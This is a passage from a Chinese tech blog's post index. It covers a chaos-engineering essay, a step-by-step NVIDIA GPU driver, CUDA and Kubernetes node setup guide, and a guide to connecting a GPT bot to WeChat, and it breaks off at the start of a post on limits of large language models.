分及格躺平，却是要守住存量的稳定性。\n事情往往就是这样，求乎上者得乎中，求乎中者得乎下。保持现状，就不是一件容易的事情。以前很多依靠人工处理的异常，现在人被裁了，处理的能力也就消失了。\n但 SLA 还是要达标，这就需要我们去寻找新的方法，去保证稳定性。混沌工程实验就是一个很好的方法，通过主动制造可控的故障，来提升系统的稳定性。\n3. 互联网应用具备混沌的特征 3.1 混沌学科的产生 在讲混沌之前，我们可以先思考一下混沌、混沌工程和我们线上服务之间的关联。\n我们经常听到的故事是，一只在亚马逊河流中的蝴蝶，煽动了几下翅膀，就能在美国引起一场龙卷风。这个故事背后隐藏着一个重要的学科，那就混沌。\n早在 20 世纪 60 年代，洛伦兹就发现了混沌现象。他是一个数学家，但是从事气象学研究，使用数学模型研究天气时发现，初始值的微小变化，会导致结果的巨大差异。对初值极其敏感，是判断为混沌状态的重要特征。之后，又经过十几年的发展和研究，才将初值敏感的特征命名为蝴蝶效应，被人们所熟知。\n3.2 混沌工程的产生 而我们谈的混沌工程，实际上指的是来自 2008 年 Netflix 的工程实践。\n在 Netflix 上云的过程中，他们发现了一个问题，上云之后，服务的稳定性会下降。原因在于，网络、机器、存储等，都是不可控的。\n因此，他们开发了一个工具，叫做 Chaos Monkey，主动破坏云服务，来发现系统的弱点，从而提高系统的稳定性。目前，这是一个上万 star 的开源项目， https://github.com/Netflix/chaosmonkey 。\n犹如一只进入了数据中心的猴子，他会随机破坏系统，你会发现系统的脆弱点，也会从故障中学习到处理经验。\n3.3 微服务与混沌的关系 目前互联网应用以微服务为主，微服务的特点是，服务之间的依赖关系非常复杂。那么，微服务具不具备混沌的特征呢？\n以下是我总结的异同点。\n相同点:\n复杂非线性连接 敏感依赖性，一个微服务的变化会影响关联的其他微服务，与混沌敏感依赖初始条件类似 可能产生巨大的累计误差，与蝴蝶效应类似 不同点:\n不确定性，微服务 \u0026lt; 典型混沌系统 微服务强调独立性，而混沌系统强调互相依赖 计算机系统是确定性的系统，程序代码是提前编写好的，运行结果是有预期的。但现实中，计算机系统真的是确定的吗？不是的，磁盘损坏、内存位翻转、网络中断，程序运行的物理世界是不确定的。此外，微服务的资源并不是独占的，高密度的部署下，CPU、内存、网络等资源都是共享的，服务与服务之间也是相互影响的。这里将其统称为程序运行的环境因素。\n从计算机系统 + 环境的角度看，我们的线上系统、微服务程序具备混沌的特征。\n4. 进行混沌工程实验的必要性 4.1 提供新的 OKR 目标 没有列入 OKR ，就不是重要事项。我们想要稳住存量，不仅要熟知现有的系统问题，还要让现有的问题能通过 OKR 的方式，被看见，被认可。\n上层有事项可列，下面有事情可干，这样才能够保证我们的工作有落地的路径。\n4.2 护航 2.0 变革 存量不能只求 60 分，我们还是需要不断地尝试新的技术、新的架构。\n在这个尝试的过程中，我们需要有一个保护机制，来确保我们的业务不受影响。混沌工程实验就是很好的破局方式，也是很好的验证方式。\n对于存量架构，我们可以拿出混沌工程实验对其进行冲击，引导其进行演进，而不是一味地去维护。\n4.3 应用所处的环境越来越复杂 我们所处的基础设施环境、软件架构越来越复杂，故障已经不可避免。\n从经典的架构看，IaaS 层可能会有服务宕机、网络抖动；PaaS 层可能会有数据库宕机、负载不均、CPU 抢占；SaaS 层可能会遇到 OOM、CPU 限流、连不上数据库等故障。\n应用及其运行环境复杂度已经远超个人能够全盘掌控的程度。我们与其等待故障，不如主动出击去制造故障。\n4.4 复现故障的成本越来越高 \u0026ldquo;我怀疑是 CPU 不够\u0026rdquo;、\u0026ldquo;我怀疑是网络有问题\u0026rdquo;、 \u0026ldquo;我怀疑连不上数据库\u0026rdquo;、”我怀疑\u0026hellip;.“\n当我们怀疑某个不确定性因素的时候，不用仅仅停留在猜想阶段，而是需要一次混沌工程实验。\n一旦有了混沌实验的方法和工具作为支撑，我们就可以通过实验来验证我们的猜想，而不是盲目地去排查。\n5. 混沌工程价值在哪里 5.1 沉淀故障处理的经验 事前有预案远比事后改进好很多。\n常见的做法是，事故发生后，我们会进行事故复盘，总结出一些故障处理的经验，然后将其沉淀到故障处理手册中。但你可能会发现，下一次事故又是新的，之前的经验并不能完全套用。\n这是因为事故处理的经验样本太少，系统太过复杂所致，而经常性的混沌实验，可以丰富故障处理的经验样本，让我们能够更好地应对未知的故障。\n5.2 检验已有缺陷、发现未知缺陷 混沌工程能够揭露生产系统中未知的缺陷，提高系统的稳定性。\n这里需要明确的一点是，如果已经确定混沌实验会出现问题，说明现有的系统并没有任何容错或者应对机制，那么这种实验也就没有任何意义。\n如果基于认知边界进行划分，可以将缺陷分为两类:\n已知缺陷，包括已经容忍的、已知但未修复的缺陷，比如单点、网络抖动等 未知缺陷，包括未知的、有认知偏差的缺陷，比如潜在的 Bug、自认为而与事实不符的缺陷等 对于认知边界内的缺陷，使用混沌实验，可以用于复现缺陷、辅助修复缺陷、检验缺陷得到修复。\n对于认知边界外的缺陷，使用混沌实验，是探索性的。我们通过混沌实验，可以发现一些被忽略、被遗漏的缺陷。\n5.3 提升应用的韧性 在研究各种混沌工程实践时，我还接触到一个有意思的概念，应用的韧性。\n刚接触到这个概念时，总感觉很熟悉，但又很难说清楚。因此，我想了一个形象的比喻，如上图的不倒翁，应用可以左摇右摆，但是依然能保持平衡。这就要求，应用能够应对各种不稳定、不确定性、突发的状况时，能够自愈。经过短暂地波动之后，能够迅速地恢复平衡状态。\n对应用不倒翁的定位，需要做以下的设计:\n冗余设计 重要的中间件，两地三中心，允许其中至少一个断连\n过载保护 当请求激增时，能够采用限流、拒绝服务等措施保护整体不受损\n服务降级能力 在服务能力不够的情况下，能有有所取舍，保障重点服务不受影响\n去中心化设计 不允许出现中心化的节点\n这些具体的要求，对于我们的业务应用是有落地路径的。我们可以按照这个要求，去评估并改造我们的应用。\n","description":"","id":79,"section":"post","tags":["博文","混沌","Chaos"],"title":"增量不再，混沌当立","uri":"https://www.chenshaowen.com/blog/the-increment-is-no-longer-chaos-is-standing.html"},{"content":"1. 安装驱动 1.1 查看系统是否识别显卡 1 2 3 4 lspci | grep -i vga 03:00.0 VGA compatible controller: NVIDIA Corporation GP102 [TITAN X] (rev a1) 0a:00.0 VGA compatible controller: Matrox Electronics Systems Ltd. G200eR2 (rev 01) 识别出显卡为 NVIDIA 的 TITAN X。\n1.2 禁用 nouveau 1 lsmod | grep nouveau 如果有输出，说明 nouveau 已经加载，需要禁用。如果没有输出，则可以跳过此操作。\nUbuntu 系统 关闭自动更新 1 sed -i.bak \u0026#39;s/1/0/\u0026#39; /etc/apt/apt.conf.d/10periodic 编辑配置文件：\n1 vim /etc/apt/apt.conf.d/50unattended-upgrades 去掉以下内容的注释\n1 2 3 4 Unattended-Upgrade::Package-Blacklist { \u0026#34;linux-image-*\u0026#34;; \u0026#34;linux-headers-*\u0026#34;; }; 编辑系统 blacklist 1 vim /etc/modprobe.d/blacklist-nouveau.conf 添加以下配置禁用 nouveau\n1 2 blacklist nouveau options nouveau modeset=0 更新 initramfs 1 update-initramfs -u 重启系统 1 reboot CentOS 系统 编辑系统 blacklist 1 vim /etc/modprobe.d/blacklist-nouveau.conf 添加配置禁用 nouveau\n1 2 blacklist nouveau options nouveau modeset=0 更新 initramfs 1 2 mv /boot/initramfs-$(uname -r).img /boot/initramfs-$(uname -r).img.bak dracut /boot/initramfs-$(uname -r).img $(uname -r) 重启系统 1 reboot 验证是否禁用成功 1 lsmod | grep nouveau 此时不应该有输出。\n1.3 安装驱动 安装基础环境 1 apt install lftp python ceph-fuse nfs-common infiniband-diags make -y 安装 GCC 1 2 apt install build-essential gcc-9 g++-9 update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 --slave /usr/bin/g++ g++ /usr/bin/g++-9 --slave /usr/bin/gcov gcov /usr/bin/gcov-9 下载驱动 访问 https://www.nvidia.com/en-us/drivers/ 选择对应的驱动版本下载。这里以 Linux 64-bit 的 TITAN X 驱动为例:\n1 wget https://us.download.nvidia.com/XFree86/Linux-x86_64/535.183.01/NVIDIA-Linux-x86_64-535.183.01.run 去 us 站点下载速度会慢点，但是 wget 不会 404。\n安装驱动 1 2 chmod +x NVIDIA-Linux-x86_64-535.146.02.run ./NVIDIA-Linux-x86_64-535.146.02.run --accept-license --silent --no-x-check --no-nouveau-check --disable-nouveau --no-opengl-files 重启系统 1 reboot 验证是否安装成功 1 nvidia-smi 2. 安装 nvidia-container-runtime 2.1 安装 Containerd 添加源 1 2 apt-get update apt-get install -y ca-certificates curl gnupg lsb-release 如果是国内:\n1 2 mkdir -p /etc/apt/keyrings curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc 1 2 3 4 echo \\ \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \\ $(. /etc/os-release \u0026amp;\u0026amp; echo \u0026#34;$VERSION_CODENAME\u0026#34;) stable\u0026#34; | \\ sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null 如果是海外:\n1 2 mkdir -p /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg 1 2 3 echo \\ \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\u0026#34; | tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null 安装 containerd 1 2 apt update apt install containerd.io=1.6.31-1 生成 containerd 配置文件 toml 1 2 mkdir -p /etc/containerd containerd config default \u0026gt; /etc/containerd/config.toml 修改 containerd 配置文件 1 2 3 4 sed -i \u0026#39;s#root = \u0026#34;/var/lib/containerd\u0026#34;#root = \u0026#34;/data/containerd\u0026#34;#g\u0026#39; /etc/containerd/config.toml sed -i \u0026#39;s#state = \u0026#34;/run/containerd\u0026#34;#state = \u0026#34;/data/run/containerd\u0026#34;#g\u0026#39; /etc/containerd/config.toml sed -i \u0026#39;s#sandbox_image = \u0026#34;registry.k8s.io/pause:3.6\u0026#34;#sandbox_image = \u0026#34;registry.aliyuncs.com/google_containers/pause:3.9\u0026#34;#g\u0026#39; /etc/containerd/config.toml sed -i \u0026#39;s#SystemdCgroup = false#SystemdCgroup = true#g\u0026#39; /etc/containerd/config.toml 重启 containerd 1 systemctl restart containerd 2.2 安装 nvidia-container-runtime Ubuntu 系统，参考[1] 1 2 3 4 curl -s -L https://nvidia.github.io/nvidia-container-runtime/gpgkey | apt-key add - distribution=$(. /etc/os-release;echo $ID$VERSION_ID) curl -s -L https://nvidia.github.io/nvidia-container-runtime/$distribution/nvidia-container-runtime.list | tee /etc/apt/sources.list.d/nvidia-container-runtime.list apt-get update 1 apt-get install -y nvidia-container-runtime CentOS 系统 1 2 distribution=$(. /etc/os-release;echo $ID$VERSION_ID) curl -s -L https://nvidia.github.io/nvidia-container-runtime/$distribution/nvidia-container-runtime.repo | tee /etc/yum.repos.d/nvidia-container-runtime.repo 1 yum install -y nvidia-container-runtime 2.3 Docker 配置 更新 Docker 配置 配置 Docker 开启 GPU 支持\n1 vim /etc/docker/daemon.json 添加以下内容：\n1 2 3 4 5 6 7 8 9 { \u0026#34;default-runtime\u0026#34;: \u0026#34;nvidia\u0026#34;, \u0026#34;runtimes\u0026#34;: { \u0026#34;nvidia\u0026#34;: { \u0026#34;path\u0026#34;: \u0026#34;/usr/bin/nvidia-container-runtime\u0026#34;, \u0026#34;runtimeArgs\u0026#34;: [] } } } 重启 Docker 1 2 systemctl daemon-reload systemctl restart docker 验证安装结果 1 docker run --rm --gpus all registry.cn-beijing.aliyuncs.com/opshub/ubuntu nvidia-smi 此时可以看到输出的 GPU 信息。\n2.4 Containerd 配置 更新 Containerd 配置 1 vim /etc/containerd/config.toml 在与 plugins.\u0026quot;io.containerd.grpc.v1.cri\u0026quot;.containerd.runtimes 中添加：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [plugins.\u0026#34;io.containerd.grpc.v1.cri\u0026#34;.containerd.runtimes.nvidia] privileged_without_host_devices = false runtime_engine = \u0026#34;\u0026#34; runtime_root = \u0026#34;\u0026#34; runtime_type = \u0026#34;io.containerd.runc.v2\u0026#34; [plugins.\u0026#34;io.containerd.grpc.v1.cri\u0026#34;.containerd.runtimes.nvidia.options] BinaryName = \u0026#34;/usr/bin/nvidia-container-runtime\u0026#34; CriuImagePath = \u0026#34;\u0026#34; CriuPath = \u0026#34;\u0026#34; CriuWorkPath = \u0026#34;\u0026#34; IoGid = 0 IoUid = 0 NoNewKeyring = false NoPivotRoot = false Root = \u0026#34;\u0026#34; ShimCgroup = \u0026#34;\u0026#34; SystemdCgroup = true 将默认的 runtime 设置为 nvidia\n1 2 [plugins.\u0026#34;io.containerd.grpc.v1.cri\u0026#34;.containerd] default_runtime_name = \u0026#34;nvidia\u0026#34; 重启 Containerd 1 2 systemctl daemon-reload systemctl restart containerd 验证安装结果 国内\n1 export IMAGE=registry.cn-beijing.aliyuncs.com/opshub/ubuntu 海外\n1 export IMAGE=ubuntu 1 nerdctl run --rm --gpus all $IMAGE nvidia-smi 3. 安装 CUDA Toolkit CUDA 是 NVIDIA 推出的通用并行计算架构，用于在 GPU 上进行通用计算。CUDA Toolkit 是 CUDA 的开发工具包，包含了编译器（NVCC）、库、调试器等工具。\n3.1 检查系统是否支持 参考 https://docs.nvidia.com/cuda/cuda-installation-guide-linux/index.html#system-requirements 有最新的 CUDA 对 CPU 架构、操作系统、GCC 版本、GLIBC 版本的依赖要求。\n检查系统版本 1 uname -m \u0026amp;\u0026amp; cat /etc/os-release 检查 GCC 版本 1 gcc --version 检查 GLIBC 版本 1 ldd --version 3.2 兼容性说明 使用 nvidia-smi 命令可以看到一个 CUDA 的版本号，但这个版本号是 CUDA driver libcuda.so 的版本号，不是 CUDA Toolkit 的版本号。\n如上图 CUDA driver 是向后兼容的，即支持之前的 CUDA Toolkit 版本。\n如上图，CUDA driver 支持向前的次要版本兼容，即大版本号相同就支持。参考[2]。\n3.3 安装 CUDA 下载 CUDA 前往 https://developer.nvidia.com/cuda-downloads 选择对应的版本下载。这里以 Ubuntu 20.04 的 runfile(local) 为例：\n1 wget https://developer.download.nvidia.com/compute/cuda/12.3.1/local_installers/cuda_12.3.1_545.23.08_linux.run 安装 CUDA 1 sh cuda_12.3.1_545.23.08_linux.run 添加环境变量 1 vim ~/.bashrc 增加以下内容：\n1 2 3 export PATH=$PATH:$PATH:/usr/local/cuda/bin export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda/lib64 export CUDA_HOME=$CUDA_HOME:/usr/local/cuda 使环境变量立即生效：\n1 source ~/.bashrc 验证安装结果 1 nvcc -V 4. 安装 cuDNN cuDNN 是 NVIDIA 基于 CUDA 开发的深度神经网络加速库。\n检查 cuDNN 依赖 前往 https://docs.nvidia.com/deeplearning/cudnn/support-matrix/index.html 查看 cuDNN 与 CUDA、Driver、操作系统的兼容性是否满足要求。\n下载 cudnn 前往 https://developer.nvidia.com/rdp/cudnn-archive 下载对应的版本，选择 Local Installer for Linux x86_64 (Tar) ，会得到一个 tar.xz 的压缩包。\n解压 cudnn 1 tar -xvf cudnn-linux-*-archive.tar.xz 安装 cudnn 1 2 3 cp cudnn-*-archive/include/cudnn*.h /usr/local/cuda/include cp -P cudnn-*-archive/lib/libcudnn* /usr/local/cuda/lib64 chmod a+r /usr/local/cuda/include/cudnn*.h /usr/local/cuda/lib64/libcudnn* 5. 开启持久模式 使用 nvidia-smi -pm 1 能够开启持久模式，但重启后会失效，同时使用 nvidia-smi 的方式已经被归档，推荐使用 nvidia-persistenced 常驻进程。\n开启持久模式之后，驱动一直会被加载，会消耗更多能源，但能有效改善各种显卡故障。\n新建配置文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cat \u0026lt;\u0026lt;EOF \u0026gt; /lib/systemd/system/nvidia-persistenced.service [Unit] Description=NVIDIA Persistence Daemon After=syslog.target [Service] Type=forking PIDFile=/var/run/nvidia-persistenced/nvidia-persistenced.pid Restart=always ExecStart=/usr/bin/nvidia-persistenced --verbose ExecStopPost=/bin/rm -rf /var/run/nvidia-persistenced/* TimeoutSec=300 [Install] WantedBy=multi-user.target EOF 启动持久模式 1 systemctl start nvidia-persistenced 查看服务状态 1 systemctl status nvidia-persistenced 开机启动持久模式 1 systemctl enable nvidia-persistenced 6. 安装 NVLink 和 NVSwitch 驱动 如果装配了 NVLink 或者 NVSwitch ，还需要安装 nvidia-fabricmanager，否则无法正常工作。\n下载 nvidia-fabricmanager 在 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/ 找到合适的版本。\n1 wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/nvidia-fabricmanager-535_535.129.03-1_amd64.deb 安装 nvidia-fabricmanager 1 apt install ./nvidia-fabricmanager-535_535.129.03-1_amd64.deb 启动 nvidia-fabricmanager 服务 1 systemctl start nvidia-fabricmanager 查看 nvidia-fabricmanager 服务 1 systemctl status nvidia-fabricmanager 开机自启 1 systemctl enable nvidia-fabricmanager 7. 安装 InfiniBand 驱动 1 wget https://content.mellanox.com/ofed/MLNX_OFED-4.9-5.1.0.0/MLNX_OFED_LINUX-4.9-5.1.0.0-ubuntu20.04-x86_64.tgz 1 2 3 tar zxf MLNX_OFED_LINUX-4.9-5.1.0.0-ubuntu20.04-x86_64.tgz cd MLNX_OFED_LINUX-4.9-5.1.0.0-ubuntu20.04-x86_64 ./mlnxofedinstall 然后重启机器，可以查看驱动状态\n1 2 3 4 5 6 7 8 9 10 11 systemctl status openibd ● openibd.service - openibd - configure Mellanox devices Loaded: loaded (/lib/systemd/system/openibd.service; enabled; vendor preset: enabled) Active: active (exited) since Mon 2024-03-11 15:30:58 CST; 1 weeks 0 days ago Docs: file:/etc/infiniband/openib.conf Process: 2261 ExecStart=/etc/init.d/openibd start bootid=65648015406c4b88b831c8b907ad4ec6 (code=exited, status=0/SUCCESS) Main PID: 2261 (code=exited, status=0/SUCCESS) Tasks: 0 (limit: 618654) Memory: 24.6M CGroup: /system.slice/openibd.service 通过 ibstat 可以查看设备信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ibstat ibstat CA \u0026#39;mlx5_0\u0026#39; CA type: MT4123 Number of ports: 1 Firmware version: 20.35.1012 Hardware version: 0 Node GUID: 0x946dae03008bcc68 System image GUID: 0x946dae03008bcc68 Port 1: State: Active Physical state: LinkUp Rate: 200 Base lid: 124 LMC: 0 SM lid: 1 Capability mask: 0xa651e848 Port GUID: 0x946dae03008bcc68 Link layer: InfiniBand CA \u0026#39;mlx5_1\u0026#39; CA type: MT4123 Number of ports: 1 Firmware version: 20.35.1012 Hardware version: 0 Node GUID: 0x946dae03008bcc3c System image GUID: 0x946dae03008bcc3c Port 1: State: Active Physical state: LinkUp Rate: 200 Base lid: 126 LMC: 0 SM lid: 1 Capability mask: 0xa651e848 Port GUID: 0x946dae03008bcc3c Link layer: InfiniBand 8. 加入 K8s 集群 8.1 修改 Hostname 1 export HOSTNAME=k8s-worker-gpu-01 1 hostnamectl set-hostname ${HOSTNAME} 8.2 初始化内核参数 1 opscli task -f ~/.ops/tasks/set-host.yaml 8.3 安装 K8s 基础组件 添加 K8s 源 https://developer.aliyun.com/mirror/kubernetes/ 1.28 以下版本添加\n1 curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - 1 2 3 cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/apt/sources.list.d/kubernetes.list deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main EOF 1 apt-get update 软链 kubelet 的目录 1 2 mkdir -p /data/kubelet ln -s /data/kubelet /var/lib/kubelet 安装 K8s 基础组件 1 export K8S_VERSION=1.27.6 1 apt-get install kubeadm=${K8S_VERSION}-00 kubelet=${K8S_VERSION}-00 kubectl=${K8S_VERSION}-00 -y 配置 kubelet 1 vim /var/lib/kubelet/kubeadm-flags.env 添加以下内容：\n1 --resolv-conf=/etc/resolv.conf --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.9 --authentication-token-webhook=true --authorization-mode=Webhook --cpu-manager-policy=static --system-reserved=cpu=1,memory=2Gi --kube-reserved=cpu=1,memory=2Gi 重启 kubelet 1 2 3 systemctl daemon-reload systemctl restart kubelet systemctl status kubelet 8.4 加入集群 生成 Token 在 master 节点生成 token\n1 kubeadm token create --print-join-command 加入集群 1 2 kubeadm join x.x.x.x:6443 --token xxx \\ --discovery-token-ca-cert-hash sha256:xxx 如果是 Docker 环境，需要走一遍 Containerd 的配置，然后带上 --cri-socket 参数。\n1 --cri-socket unix:///run/containerd/containerd.sock -v5 8.5 创建测试的 Pod 创建 Pod 国内\n1 export IMAGE=registry.cn-beijing.aliyuncs.com/opshub/nvidia-cuda:12.3.2-base-ubuntu22.04 海外\n1 export IMAGE=hubimage/nvidia-cuda:12.3.2-base-ubuntu22.04 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: gpu-demo spec: nodeName: ${HOSTNAME} containers: - name: gpu-demo image: ${IMAGE} command: [\u0026#34;nvidia-smi\u0026#34;] resources: requests: tencent.com/vcuda-core: 100 limits: tencent.com/vcuda-core: 100 EOF 查看 Pod 状态 1 kubectl logs gpu-demo 删除 Pod 1 kubectl delete pod gpu-demo 9. 部署 k8s-rdma-shared-dev-plugin 为了让 Kubernetes 能够发现 RDMA 设备，比如 IfiniBand ，并且被多个 Pod 使用，需要安装 k8s-rdma-shared-dev-plugin。\n安装 k8s-rdma-shared-dev-plugin 1 kubectl apply -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/network/k8s-rdma-shared-dev-plugin.yaml 修改配置文件 1 kubectl -n kube-system edit cm rdma-devices Pod 中配置使用 在 spec 中配置 rdma/ib 就可以使用了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 spec: containers: - command: - /bin/sh - -c - mkdir -p /var/run/sshd; /usr/sbin/sshd;bash llama_distributed_v3.0_check.sh resources: limits: cpu: \u0026#34;64\u0026#34; memory: 950Gi rdma/ib: \u0026#34;8\u0026#34; tencent.com/vcuda-core: \u0026#34;800\u0026#34; requests: cpu: \u0026#34;64\u0026#34; memory: 950Gi rdma/ib: \u0026#34;8\u0026#34; tencent.com/vcuda-core: \u0026#34;800\u0026#34; 10. 参考 https://nvidia.github.io/nvidia-container-runtime/ https://tianzhipeng-git.github.io/2023/11/21/cuda-version.html ","description":"","id":80,"section":"post","tags":["博文","AI","GPU","NVIDIA","硬件","驱动"],"title":"NVIDIA GPU 驱动安装","uri":"https://www.chenshaowen.com/blog/nvidia-gpu-driver-installation.html"},{"content":" 提供有偿接入服务，200 RMB/年；另外，提供技术支持 200 RMB/次，不超过 1 hour；关注公众号，可获得联系方式。\n1. 需要提供的信息 进入 https://mp.weixin.qq.com/ 在左侧菜单栏 【设置与开发】-\u0026gt; 【基本设置】，就能找到下面的信息\nAppID 开发者 ID，可以明文直接查看到。\nAppSecret 开发者密码，需要点击一下【重置】，才能获取到。\n2. 接入公众号 2.1 参数说明 URL 类似这样 https://api.chenshaowen.com/v1/mp\nToken 长度为 3-32 字符，类似 lg36YKM8YENbGMGhzWde1mjItkRZ0Z\n我会使用下面的脚本生成:\n1 echo $(openssl rand -base64 100 | tr -d \u0026#39;/+=\u0026#39; | head -c 30) EncodingAESKey 长度为 43 位字符，类似 XFfydEWkz1Eu4pjBZilgJyZ9nDaul6ctftYxeR0Qv1b\n我会使用下面的脚本生成:\n1 echo $(openssl rand -base64 100 | tr -d \u0026#39;/+=\u0026#39; | head -c 43) IP 白名单【服务号需要，订阅号不用】\n1.1.1.1\n2.2.2.2\n类似这样格式，每行一个 IP 地址。\n2.2 修改参数 进入 https://mp.weixin.qq.com/ 在左侧菜单栏 【设置与开发】-\u0026gt; 【基本设置】，点击 【修改配置】\n进入【基础配置】/【填写服务器配置】页面\n第一步，填写 URL，详情见上面的说明\n第二步，填写 Token，详情见上面的说明\n第三步，填写 EncodingAESKey，详情见上面的说明\n第四步，设置消息加解密方式为【兼容模式】\n最后，点击【提交】按钮\n2.3 启动服务器配置 如上图，点击【启用】按钮，启动服务器配置。\n2.4 【服务号】安全配置 进入 https://mp.weixin.qq.com/ 在左侧菜单栏 【设置与开发】-\u0026gt; 【安全中心】，在【IP 白名单】点击【查看】\n进入 IP 白名单修改页面，点击修改\n将上面的 IP 白名单填写到这里，每行一个 IP 地址，点击【确认修改】按钮保存修改即可。\n2.5 测试公众号 直接在公众号与 GPT 服务对话即可，这里的 GPT 带有知识库。在这个测试场景中，知识库已经录入了全部博客文章。\n3. 接入微信 3.1 安装 Docker 请前往 https://docs.docker.com/engine/install/ ，参考官方文档安装 Docker\n3.2 参数说明 OPEN_AI_API_KEY 类似 lg36YKM8YENbGMGhzWde1mjItkRZ0Z，用来调用 GPT 服务的 Token\nOPEN_AI_API_BASE 类似 https://api.chenshaowen.com/v1/wx，用来调用 GPT 服务的 URL\nSINGLE_CHAT_PREFIX 类似 [\u0026ldquo;bot\u0026rdquo;, \u0026ldquo;@bot\u0026rdquo;] 的格式，仅当 bot，@bot 开头的消息才会被处理。当为 [\u0026quot;\u0026quot;] 时，所有消息都会被处理\nSINGLE_CHAT_REPLY_PREFIX 类似 \u0026ldquo;[bot]\u0026rdquo; 的格式，每次 GPT 生成的回复消息，都会在前面加上这个前缀\nGROUP_CHAT_PREFIX 类似 [\u0026ldquo;bot\u0026rdquo;, \u0026ldquo;@bot\u0026rdquo;] 的格式，仅当 bot，@bot 开头的消息才会被处理\nGROUP_NAME_WHITE_LIST 类似 [\u0026ldquo;相亲相爱一家人\u0026rdquo;] 的格式，仅当群名称在白名单中时，才会被处理。当为 [\u0026ldquo;ALL_GROUP\u0026rdquo;] 时，所有群都会被处理\n3.3 配置参数 env.txt 本地新建一个文件 env.txt 1 touch env.txt 也可以人工创建一个 env.txt 的文本文件即可。\n将下面的内容复制到 env.txt 文件中 1 2 3 4 5 6 7 8 OPEN_AI_API_KEY=替换成提供的 OPEN_AI_API_KEY 值 OPEN_AI_API_BASE=替换成提供的 OPEN_AI_API_BASE 地址 SINGLE_CHAT_PREFIX=[\u0026#34;\u0026#34;] SINGLE_CHAT_REPLY_PREFIX=\u0026#34;\u0026#34; GROUP_CHAT_PREFIX=[\u0026#34;\u0026#34;] GROUP_NAME_WHITE_LIST=[\u0026#34;ALL_GROUP\u0026#34;] 3.4 启动服务 1 docker run --env-file env.txt hubimage/chatgpt-on-wechat 很快会输出这样一段信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 https://api.pwmqr.com/qrcode/create/?url=https://login.weixin.qq.com/l/wZKFuKlDiA== https://my.tv.sohu.com/user/a/wvideo/getQRCode.do?text=https://login.weixin.qq.com/l/wZKFuKlDiA== https://api.qrserver.com/v1/create-qr-code/?size=400×400\u0026amp;data=https://login.weixin.qq.com/l/wZKFuKlDiA== https://api.isoyu.com/qr/?m=1\u0026amp;e=L\u0026amp;p=20\u0026amp;url=https://login.weixin.qq.com/l/wZKFuKlDiA== █▀▀▀▀▀▀▀█▀▀▀█▀█▀██▀████▀▀▀▀▀▀▀█ █ █▀▀▀█ █▀ ▀ ▀ █ ▀█▀ █ █▀▀▀█ █ █ █ █ ██ ▀▄▄▀ █▄▀█▄█ █ █ █ █ ▀▀▀▀▀ █ █ ▄ █ █ ▄ █▀█ ▀▀▀▀▀ █ █▀█▀███▀▀█ ▀█ ██▀▄██▄ ██▀██▀█▀█ █▀▀▀██▄▀ █▄▄█▄ ▀ █▀ ▀█▄▄▀▀▀▄ █ █▀▀▄ ▄█▀ ▀█ ▀▀▄ █▄▄ ▀ ▀▄▄██▀█ █▀ ▄▄█▀▀█▀ ▀▄▀▀▀▄▄█ ▄█▄▄███▄ █ █▄ ▄▀▀█▀██▄ ▀ █ ▄▀█▄█▀█ ████▀█ █▀▀███▀▀██ ██▀ ▄▀ █ ▄ ▄█▀▄▄ █ █▀▀ ▀ █▀█▄█ ▀▀█ ▄██ █▀ ▀█▀██ █▀▀▀▀▀▀▀█ █▄▀▀ ▄▀▄▄█▄ █▀█ ▄▄█ █ █ █▀▀▀█ ██▀▄ █▀ ▄█▄ ▀▀▀ ▀█▀▄█ █ █ █ █▀▀█▀ ▀▀ ▄ █ █ ██ ▄▄▀ █ █ ▀▀▀▀▀ █▀ ██▀ ▄ █▀█ ▄▀██ ██▀█ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 使用微信扫描二维码，GPT 服务就接入到微信了，此时 PC 端的微信会被强制下线。\n3.5 测试 在这个测试场景中，微信会自动响应全部消息。\n","description":"","id":81,"section":"post","tags":["博文","LLM","GPT","公众号","微信"],"title":"微信、公众号接入 GPT 服务","uri":"https://www.chenshaowen.com/blog/how-to-access-gpt-service-on-wechat.html"},{"content":"1. 直接使用大模型面临的问题 输出不稳定性 生成式 AI 的特点之一，输出结果的多样性。同样一个问题，问大模型多次，可能会得到不同的答案。\n这种输出的不确定性，在对话、创作场景下，会给用户带来惊喜。但在确定性要求比较高的场景下，大模型进入不了采纳阶段。\n数据新鲜度不够 训练大模型是一个花钱费时的过程。训练的数据集，不能及时被更新，使用截止一两年前的数据来训练大模型十分常见。\n这种数据即时性的缺失，会让大模型的输出价值大打折扣，让大模型的应用范围受到限制。\n仅面向人类，脱离物理世界 如果把大模型比作人的大脑，Chat 